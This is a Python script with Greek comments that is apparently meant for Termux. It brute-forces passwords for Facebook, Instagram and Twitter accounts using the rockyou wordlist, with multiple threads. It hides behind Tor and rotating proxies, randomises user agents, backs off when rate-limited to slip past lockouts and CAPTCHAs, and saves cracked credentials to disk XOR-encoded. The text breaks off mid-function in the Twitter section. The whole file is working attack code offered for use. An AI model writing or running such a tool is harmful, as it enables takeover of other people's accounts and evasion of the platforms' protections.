#!/data/data/com.termux/files/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, json, time, random, threading, queue, socket, subprocess, urllib.request, signal
from datetime import datetime
import re # Προστέθηκε για προηγμένη ανάλυση CSRF σε Instagram/LinkedIn

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests

# ========== Διαμόρφωση & Διαδρομές ==========
HOME = os.path.expanduser("~")
RESULTS_DIR = os.path.join(HOME, "storage/downloads/SocialBrute")
WORDLIST_DIR = os.path.join(HOME, ".socialbrute_wordlists")
TASKS_PATH = os.path.join(HOME, ".socialbrute_tasks.json")

ROCKYOU_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
ROCKYOU_PATH = os.path.join(WORDLIST_DIR, "rockyou.txt")

# --- Προηγμένη Διαμόρφωση Proxy ---
# ΣΗΜΑΝΤΙΚΟ: Αντικαταστήστε με τους δικούς σας υγιείς proxies.
# Παράδειγμα: "http://user:pass@proxy1.com:8080", "https://proxy2.com:443", "socks5://127.0.0.1:9050" (για Tor)
# Αν μείνει κενό, το script θα τρέξει χωρίς proxies (λιγότερο αποτελεσματικό κατά των ορίων ρυθμού).
PROXY_LIST = [
    # "http://your_proxy_ip:port",
    # "https://another_proxy_ip:port",
    "socks5://127.0.0.1:9050", # Προεπιλεγμένος proxy του Tor. Βεβαιωθείτε ότι ο Tor εκτελείται ή είναι εγκατεστημένος.
]
PROXY_HEALTH_CHECK_URL = "http://httpbin.org/ip" # Χρησιμοποιείται για να ελέγξει αν ο proxy λειτουργεί

DEFAULT_KEY = 37
MAX_BACKOFF = 300 # Αυξημένο μέγιστο backoff σε δευτερόλεπτα
MAX_THREADS = 6
MAX_ATTEMPTS = 5 # Αυξημένες προσπάθειες ανά κωδικό πριν παραιτηθεί
TASK_SYNC_INTERVAL = 15

stop_event = threading.Event()
print_lock = threading.Lock()
write_lock = threading.Lock()

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
]

# Καθολική λίστα υγιών proxies και μια ουρά για περιστροφή
active_proxies = []
proxy_queue = queue.Queue()
proxy_lock = threading.Lock() # Για τη διαχείριση της πρόσβασης στους proxies

# ========== Βοηθητικές συναρτήσεις ==========
def safe_print(msg: str):
    with print_lock:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def ensure_dirs():
    for d in [RESULTS_DIR, WORDLIST_DIR]:
        if not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)

def download_wordlist():
    if os.path.isfile(ROCKYOU_PATH):
        safe_print("[*] Η λίστα λέξεων rockyou.txt βρέθηκε, παραλείπεται η λήψη.")
        return
    safe_print("[*] Λήψη rockyou.txt (μεγάλο αρχείο, υπομονή)...")
    try:
        urllib.request.urlretrieve(ROCKYOU_URL, ROCKYOU_PATH)
        safe_print("[*] Η λίστα λέξεων κατέβηκε.")
    except Exception as e:
        safe_print(f"[!] Η λήψη της λίστας λέξεων απέτυχε: {e}")

def xor_encrypt(data: str, key: int = DEFAULT_KEY) -> str:
    return "".join(chr(ord(c) ^ key) for c in data)

def save_credentials(service: str, target: str, username: str, password: str):
    filename = os.path.join(RESULTS_DIR, f"{service}_{target}.txt")
    encrypted = xor_encrypt(f"{username} | {password}\n")
    with write_lock:
        with open(filename, "a") as f:
            f.write(encrypted)
            f.flush()
    safe_print(f"[*] Τα διαπιστευτήρια αποθηκεύτηκαν κρυπτογραφημένα στο {filename}")

def random_user_agent():
    return random.choice(DEFAULT_USER_AGENTS)

def check_proxy_health(proxy_url):
    """Ελέγχει αν μια δεδομένη διεύθυνση URL proxy είναι υγιής κάνοντας μια προσπάθεια αιτήματος μέσω αυτής."""
    try:
        proxies = {"http": proxy_url, "https": proxy_url}
        session = requests.Session()
        session.headers.update({"User-Agent": random_user_agent()})
        resp = session.get(PROXY_HEALTH_CHECK_URL, proxies=proxies, timeout=10)
        return resp.status_code == 200
    except requests.exceptions.RequestException:
        return False

def initialize_proxy_pool():
    """Αρχικοποιεί την καθολική δεξαμενή proxy ελέγχοντας την υγεία του PROXY_LIST."""
    global active_proxies
    active_proxies = []
    if not PROXY_LIST:
        safe_print("[*] Δεν έχουν διαμορφωθεί proxies στο PROXY_LIST. Εκτέλεση χωρίς proxies.")
        return

    safe_print("[*] Αρχικοποίηση δεξαμενής proxy...")
    for proxy_url in PROXY_LIST:
        if "socks5" in proxy_url.lower() and not is_tor_running():
            if not start_tor():
                safe_print(f"[!] Ο Tor απέτυχε να ξεκινήσει για τον {proxy_url}, παραλείπεται.")
                continue
        if check_proxy_health(proxy_url):
            active_proxies.append(proxy_url)
            safe_print(f"[*] Ο proxy {proxy_url} είναι υγιής.")
        else:
            safe_print(f"[!] Ο proxy {proxy_url} είναι μη υγιής ή μη προσβάσιμος.")
    
    if not active_proxies:
        safe_print("[!] Δεν υπάρχουν διαθέσιμοι υγιείς proxies από τη λίστα. Κάντε brute-force χωρίς proxies.")
        if is_tor_running(): # Βεβαιωθείτε ότι ο Tor σταματά αν ξεκίνησε και μετά βρέθηκε μη υγιής
            stop_tor()
    else:
        random.shuffle(active_proxies) # Ανακατεύουμε για καλύτερη κατανομή
        for p in active_proxies:
            proxy_queue.put(p)
        safe_print(f"[*] {len(active_proxies)} υγιείς proxies προστέθηκαν στη δεξαμενή.")

def get_next_proxy():
    """Ανακτά τον επόμενο proxy από την ουρά περιστροφής. Την ξαναγεμίζει αν είναι άδεια."""
    with proxy_lock:
        if proxy_queue.empty():
            if not active_proxies:
                return None # Δεν έχουν αρχικοποιηθεί proxies
            safe_print("[*] Η ουρά proxy εξαντλήθηκε, ξαναγεμίζεται...")
            random.shuffle(active_proxies)
            for p in active_proxies:
                proxy_queue.put(p)
        if not proxy_queue.empty():
            return proxy_queue.get()
        return None # Εφεδρικό αν για κάποιο λόγο παραμένει άδειο

def create_advanced_session():
    """Δημιουργεί μια συνεδρία αιτημάτων με ρεαλιστικές κεφαλίδες."""
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "DNT": "1", # Κεφαλίδα Do Not Track
        "Upgrade-Insecure-Requests": "1" # Αίτημα αναβάθμισης σε HTTPS
        # Μπορούν να προστεθούν εδώ επιπλέον κεφαλίδες για συγκεκριμένους ιστότοπους:
        # "Sec-Ch-Ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        # "Sec-Ch-Ua-Mobile": "?0",
        # "Sec-Ch-Ua-Platform": '"Windows"',
    })
    sess.timeout = 20 # Αυξημένο timeout για πιθανή καθυστέρηση του proxy
    return sess

def is_tor_running():
    """Ελέγχει αν η διαδικασία του Tor εκτελείται προσπαθώντας να συνδεθεί στη θύρα SOCKS του."""
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect(("127.0.0.1", 9050))
        sock.close()
        return True
    except:
        return False

def start_tor():
    """Προσπαθεί να ξεκινήσει τον δαίμονα του Tor."""
    if is_tor_running():
        safe_print("[*] Ο Tor ήδη εκτελείται.")
        return True
    safe_print("[*] Εκκίνηση Tor...")
    # Χρήση της εντολής 'tor'. Βεβαιωθείτε ότι το πακέτο 'tor' είναι εγκατεστημένο στο Termux.
    # Για Termux: pkg install tor
    proc = subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15) # Δίνουμε χρόνο στον Tor να ξεκινήσει και να συνδεθεί στο δίκτυο
    if proc.poll() is None: # Ελέγξτε αν η διαδικασία εξακολουθεί να εκτελείται (ο Tor ξεκίνησε με επιτυχία)
        safe_print("[*] Ο Tor ξεκίνησε.")
        return True
    safe_print("[!] Αποτυχία εκκίνησης του Tor. Βεβαιωθείτε ότι ο 'tor' είναι εγκατεστημένος και διαμορφωμένος σωστά.")
    return False

def stop_tor():
    """Σταματά τη διαδικασία δαίμονα του Tor."""
    subprocess.run(["pkill", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    safe_print("[*] Ο Tor σταμάτησε.")

def load_passwords(path: str, max_pwds: int):
    """Φορτώνει κωδικούς από ένα καθορισμένο αρχείο λίστας λέξεων."""
    pwds = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= max_pwds:
                    break
                pwd = line.strip()
                if pwd:
                    pwds.append(pwd)
        safe_print(f"[*] Φορτώθηκαν {len(pwds)} κωδικοί από το {path}.")
    except Exception as e:
        safe_print(f"[!] Η φόρτωση κωδικών απέτυχε: {e}")
    return pwds

def progress_bar(curr, total, bar_len=40):
    """Εμφανίζει μια γραμμή προόδου στη γραμμή εντολών."""
    frac = curr / total if total else 1
    filled = int(bar_len * frac)
    bar = '=' * filled + '-' * (bar_len - filled)
    pct = int(frac * 100)
    eta = (total - curr) * 0.75 # Απλή εκτίμηση ETA (μπορεί να βελτιωθεί)
    sys.stdout.write(f"\r[{bar}] {pct}% ETA: {int(eta)}s")
    sys.stdout.flush()

# Λειτουργίες συγχρονισμού κατανεμημένων εργασιών (για συνέχιση ή λειτουργία πολλαπλών περιπτώσεων)
def load_tasks():
    """Φορτώνει εργασίες από το αρχείο JSON εργασιών."""
    if not os.path.isfile(TASKS_PATH):
        with open(TASKS_PATH, "w") as f:
            json.dump([], f)
    try:
        with open(TASKS_PATH, "r") as f:
            tasks = json.load(f)
            if not isinstance(tasks, list):
                return [] # Βεβαιωθείτε ότι είναι μια λίστα
            return tasks
    except json.JSONDecodeError:
        safe_print(f"[!] Σφάλμα αποκωδικοποίησης {TASKS_PATH}, δημιουργείται νέο κενό αρχείο.")
        with open(TASKS_PATH, "w") as f:
            json.dump([], f)
        return []
    except Exception as e:
        safe_print(f"[!] Σφάλμα φόρτωσης εργασιών: {e}")
        return []

def save_tasks(tasks):
    """Αποθηκεύει εργασίες στο αρχείο JSON εργασιών."""
    with write_lock:
        with open(TASKS_PATH, "w") as f:
            json.dump(tasks, f, indent=2)

def add_task(task: dict):
    """Προσθέτει μια εργασία στην καθολική λίστα εργασιών και την αποθηκεύει."""
    tasks = load_tasks()
    if task not in tasks:
        tasks.append(task)
        save_tasks(tasks)

def remove_task(task: dict):
    """Αφαιρεί μια εργασία από την καθολική λίστα εργασιών και την αποθηκεύει."""
    tasks = load_tasks()
    tasks = [t for t in tasks if not (t['service'] == task['service'] and t['target'] == task['target'] and t['password'] == task['password'])]
    save_tasks(tasks)

def detect_captcha(response) -> bool:
    """Προσπαθεί να ανιχνεύσει την παρουσία CAPTCHA σε μια απάντηση HTTP."""
    try:
        text = response.text.lower()
    except:
        text = ""
    for key in ["captcha", "bot", "challenge", "verify you are human", "recaptcha", "h-captcha", "are you a robot", "jschallenge"]:
        if key in text:
            return True
    return False

def solve_captcha():
    """Προσομοιώνει την επίλυση CAPTCHA ή ενσωματώνεται με ένα API επίλυσης CAPTCHA."""
    # Αυτός είναι ένας placeholder. Για πραγματική προηγμένη χρήση, ενσωματώστε υπηρεσίες όπως το 2Captcha ή το Anti-Captcha.
    # Π.χ., captcha_solver.solve(sitekey, url)
    wait = random.randint(30, 60) # Μεγαλύτερος χρόνος αναμονής για προσομοίωση CAPTCHA
    safe_print(f"[*] Ανιχνεύτηκε Captcha, αναμονή {wait}s ή προσπάθεια αυτοματοποιημένης επίλυσης (εάν έχει υλοποιηθεί)...")
    time.sleep(wait)

# ========== Βασική κλάση για brute forcing ==========
class BaseBruteForce:
    def __init__(self, target, passwords, service):
        self.target = target
        self.passwords = passwords
        self.service = service
        self.queue = queue.Queue()
        self.max_attempts = MAX_ATTEMPTS
        self.initial_backoff = 1 # Αρχικό backoff για εκθετική ανάπτυξη σε δευτερόλεπτα
        self.success_pwd = None
        self.threads = []
        self._fill_queue()

    def _fill_queue(self):
        """Γεμίζει την ουρά κωδικών, λαμβάνοντας υπόψη προηγούμενες αποτυχημένες προσπάθειες."""
        tasks = load_tasks()
        distributed_pwds = {t['password']: t.get('attempts', 0) for t in tasks if t['service'] == self.service and t['target'] == self.target}
        for pwd in self.passwords:
            attempts = distributed_pwds.get(pwd, 0)
            if attempts < self.max_attempts:
                self.queue.put((pwd, attempts))

    def _update_task(self, password, attempts):
        """Ενημερώνει ή προσθέτει μια εργασία (προσπάθεια κωδικού) στο αρχείο εργασιών."""
        tasks = load_tasks()
        found = False
        for t in tasks:
            if t['service'] == self.service and t['target'] == self.target and t['password'] == password:
                t['attempts'] = attempts
                found = True
                break
        if not found:
            tasks.append({"service": self.service, "target": self.target, "password": password, "attempts": attempts})
        save_tasks(tasks)

    def _remove_task(self, password):
        """Αφαιρεί την εργασία ενός κωδικού που βρέθηκε με επιτυχία από το αρχείο εργασιών."""
        tasks = load_tasks()
        tasks = [t for t in tasks if not (t['service'] == self.service and t['target'] == self.target and t['password'] == password)]
        save_tasks(tasks)

    def get_session_with_proxy(self):
        """Δημιουργεί μια νέα συνεδρία αιτημάτων και της εκχωρεί έναν proxy από τη δεξαμενή."""
        session = create_advanced_session()
        proxy_url = get_next_proxy()
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
            safe_print(f"[*] Χρήση proxy: {proxy_url}")
        else:
            safe_print("[!] Δεν υπάρχουν ενεργοί proxies για αυτήν τη συνεδρία, συνεχίζεται χωρίς proxy.")
        return session

    def worker(self):
        """Αφηρημένη μέθοδος για την λογική brute-force της κάθε υπηρεσίας."""
        raise NotImplementedError

    def start(self):
        """Διαχειρίζεται τα νήματα εργασίας και τη συνολική διαδικασία brute-force."""
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True # Επιτρέπει στο πρόγραμμα να κλείσει ακόμα κι αν τα νήματα εκτελούνται
            t.start()
            self.threads.append(t)
        try:
            while any(t.is_alive() for t in self.threads):
                if stop_event.is_set():
                    break
                time.sleep(0.1) # Αποτρέπει την αναμονή απασχόλησης
        except KeyboardInterrupt:
            safe_print("\n[*] Ανιχνεύτηκε Ctrl+C, διακοπή...")
            stop_event.set() # Σηματοδοτεί στα νήματα να σταματήσουν
        for t in self.threads:
            t.join() # Περιμένει όλα τα νήματα να τελειώσουν με χάρη
        if self.success_pwd:
            safe_print(f"[*] ΕΠΙΤΥΧΙΑ: Ο κωδικός βρέθηκε: {self.success_pwd}")
            save_credentials(self.service, self.target, self.target, self.success_pwd)
            self._remove_task(self.success_pwd)
        else:
            safe_print("[*] Το brute force ολοκληρώθηκε: Ο κωδικός δεν βρέθηκε.")

# ========== Υλοποιήσεις Υπηρεσιών ==========

class FacebookBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://mbasic.facebook.com/login.php"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy() # Κάθε εργάτης παίρνει τη δική του συνεδρία/proxy
        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            # Προσαρμοσμένο Εκθετικό Backoff
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[FB] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()}) # Περιστροφή User-Agent ανά αίτημα
                resp = local_session.get(login_url, timeout=20) # Αυξημένο timeout
                
                if resp.status_code == 429: # Πάρα πολλά αιτήματα
                    safe_print(f"[FB] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy() # Λήψη νέας συνεδρίας με νέο proxy
                    self.queue.put((pwd, attempts + 1)) # Επανατοποθέτηση στην ουρά για άλλη προσπάθεια
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5)) # Μεγαλύτερο backoff μετά το όριο ρυθμού
                    continue
                elif resp.status_code != 200:
                    safe_print(f"[FB] Σφάλμα σελίδας σύνδεσης {resp.status_code}, επανατοποθέτηση στην ουρά και backoff.")
                    local_session = self.get_session_with_proxy() # Δοκιμή νέας συνεδρίας/proxy για την επόμενη προσπάθεια
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(resp):
                    solve_captcha() # Προσομοίωση/προσπάθεια επίλυσης CAPTCHA
                    local_session = self.get_session_with_proxy() # Λήψη νέας συνεδρίας/proxy μετά το CAPTCHA για να δοκιμάσει εκ νέου
                    self.queue.put((pwd, attempts + 1)) # Επανατοποθέτηση στην ουρά για άλλη προσπάθεια
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                data = {"email": self.target, "pass": pwd, "login": "Log In"}
                post_resp = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                cookies = post_resp.cookies.get_dict()
                
                tried += 1
                progress_bar(tried, total)

                # Έλεγχος για ενδείξεις επιτυχούς σύνδεσης
                if "c_user" in cookies or ("/home.php" in post_resp.headers.get("Location", "") and post_resp.status_code in [302, 303]):
                    self.success_pwd = pwd
                    stop_event.set() # Σηματοδοτεί σε όλα τα νήματα να σταματήσουν
                    self.queue.task_done()
                    safe_print(f"\n[FB] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif "password_incorrect" in post_resp.text.lower() or "incorrect password" in post_resp.text.lower():
                    safe_print(f"\n[FB] Λάθος κωδικός για τον {self.target}: {pwd}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[FB] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd} (κατάσταση: {post_resp.status_code}, μήκος απάντησης: {len(post_resp.text)})")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                # Μικρή τυχαία καθυστέρηση μεταξύ των προσπαθειών, ακόμα κι αν είναι επιτυχής ή ρητή αποτυχία
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[FB] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy() # Λήψη νέας συνεδρίας με νέο proxy
                time.sleep(random.uniform(current_delay, current_delay * 2)) # Μεγαλύτερο backoff για σφάλματα δικτύου
            except Exception as e:
                safe_print(f"[FB] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class InstagramBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        local_session = self.get_session_with_proxy()
        
        # Λήψη του CSRF token - απαραίτητο για το Instagram
        try:
            r = local_session.get("https://www.instagram.com/accounts/login/", timeout=20)
            csrf = r.cookies.get("csrftoken", "")
            if csrf:
                local_session.headers.update({"X-CSRFToken": csrf, "Referer": "https://www.instagram.com/accounts/login/"})
            else:
                safe_print("[IG] Προειδοποίηση: Το CSRF token λείπει από το αρχικό αίτημα GET. Προσπάθεια εξαγωγής από τον πηγαίο κώδικα της σελίδας.")
                match = re.search(r'"csrf_token":"(.*?)"', r.text)
                if match:
                    csrf = match.group(1)
                    local_session.headers.update({"X-CSRFToken": csrf})
                    safe_print(f"[IG] Βρέθηκε το CSRF token στο JSON: {csrf}")
                else:
                    safe_print("[IG] Κρίσιμο: Δεν ήταν δυνατή η λήψη του CSRF token. Το brute force στο Instagram πιθανότατα θα αποτύχει.")
                    # Αν το CSRF είναι κρίσιμο και δεν βρέθηκε, ίσως είναι καλύτερο να σταματήσει αυτός ο εργάτης
                    self.queue.put((self.target, self.max_attempts)) # Σημειώστε όλους τους κωδικούς ως μέγιστες προσπάθειες για να τελειώσετε πιο γρήγορα
                    return
        except Exception as e:
            safe_print(f"[IG] Η λήψη του CSRF token απέτυχε: {e}. Ο εργάτης σταματάει.")
            self.queue.put((self.target, self.max_attempts)) # Σημειώστε όλους τους κωδικούς ως μέγιστες προσπάθειες
            return

        total = self.queue.qsize()
        tried = 0
        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[IG] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {
                    "username": self.target,
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{pwd}", # Αυτή η μορφή είναι κρίσιμη για το Instagram
                    "queryParams": {},
                    "optIntoOneTap": False
                }
                
                # Επαναληπτική λήψη του CSRF token εάν η συνεδρία αλλάξει ή καταστεί άκυρη (π.χ. μετά από αλλαγή proxy)
                if "X-CSRFToken" not in local_session.headers or not local_session.headers["X-CSRFToken"]:
                    safe_print("[IG] Επαναληπτική λήψη του CSRF token...")
                    r_csrf_refresh = local_session.get("https://www.instagram.com/accounts/login/", timeout=20)
                    new_csrf = r_csrf_refresh.cookies.get("csrftoken", "")
                    if new_csrf:
                        local_session.headers.update({"X-CSRFToken": new_csrf})
                    else:
                        safe_print("[IG] Προειδοποίηση: Δεν ήταν δυνατή η επαναληπτική λήψη του CSRF token.")
                        # Αυτή η προσπάθεια πιθανότατα θα αποτύχει, επανατοποθέτηση στην ουρά και δοκιμή νέας συνεδρίας/proxy
                        self.queue.put((pwd, attempts + 1))
                        self._update_task(pwd, attempts + 1)
                        local_session = self.get_session_with_proxy()
                        self.queue.task_done()
                        continue
                
                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[IG] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                json_resp = r.json()
                tried += 1
                progress_bar(tried, total)

                if json_resp.get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[IG] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif "checkpoint_required" in json_resp:
                    safe_print("[IG] Απαιτείται σημείο ελέγχου (2FA/ύποπτη δραστηριότητα) - σταματάμε για να αποφύγουμε κλείδωμα για αυτόν τον στόχο.")
                    stop_event.set()
                    self.queue.task_done()
                    break
                elif json_resp.get("user") == False or json_resp.get("feedback_message"):
                    safe_print(f"\n[IG] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd} - {json_resp.get('feedback_message', 'No specific feedback').strip()}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[IG] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)

                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[IG] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except json.JSONDecodeError:
                safe_print(f"[IG] Σφάλμα αποκωδικοποίησης JSON - μη αναμενόμενη μορφή απάντησης για τον {self.target}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[IG] Μη αναμενόμενη Εξαίρεση: {e}. Επανατοποθέτηση στην ουρά.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class TwitterBrute(BaseBruteForce):
    def worker(self):
        # Το API του Twitter είναι πολύπλοκο και με αυστηρά όρια ρυθμού για προσπάθειες σύνδεσης.
        # Το τελικό σημείο xauth_password.json έχει καταργηθεί για ροές σύνδεσης μέσω ιστού. Το σύγχρονο Twitter (X) χρησιμοποιεί OAuth2 + JS.
        # Μια πραγματικά λειτουργική λύση θα περιλάμβανε πιθανώς τη χρήση Selenium/Playwright με έναν headless browser
        # για να πλοηγηθεί σε ολόκληρη τη ροή σύνδεσης και να διαχειριστεί τις προκλήσεις του JavaScript.
        login_url = "https://api.twitter.com/auth/1/xauth_password.json" # Παρωχημένο τελικό σημείο
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()
        
        safe_print("[TW] Προειδοποίηση: Το API σύνδεσης του Twitter προστατεύεται πολύ και αυτή η άμεση μέθοδος API είναι απίθανο να λειτουργήσει αξιόπιστα.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[TW] Καθυστέρηση {current_delay:.2f}s πριν την επανάληψη για το '{pwd}' ({attempts} αποτυχημένες προσπάθειες).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {"username": self.target, "password": pwd}
                r = local_session.post(login_url, data=data, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[TW] Ανιχνεύτηκε όριο ρυθμού (429), αλλαγή proxy και backoff.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue
                elif detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                if r.status_code == 200 and "token" in r.text: # Παρωχημένος έλεγχος για επιτυχία
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[TW] Η ταυτοποίηση ήταν επιτυχής για τον {self.target} με κωδικό: {pwd}")
                    break
                elif r.status_code == 401: # Μη εξουσιοδοτημένος (συνήθως λανθασμένα διαπιστευτήρια)
                    try:
                        error_json = r.json()
                        error_message = error_json.get("errors", [{}])[0].get("message", "Authentication failed")
                        safe_print(f"\n[TW] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd}. Σφάλμα: {error_message}")
                    except json.JSONDecodeError:
                        safe_print(f"\n[TW] Αποτυχημένη προσπάθεια για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}")
                else:
                    safe_print(f"\n[TW] Μη διαχειριζόμενη απάντηση για τον {self.target} με κωδικό: {pwd}. Κατάσταση: {r.status_code}, Απάντηση: {r.text[:200]}...")
                
                self.queue.put((pwd, attempts + 1))
                self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[TW] Εξαίρεση δικτύου/αιτήματος: {e}. Επανατοποθέτηση στην ουρά και αλλαγή proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
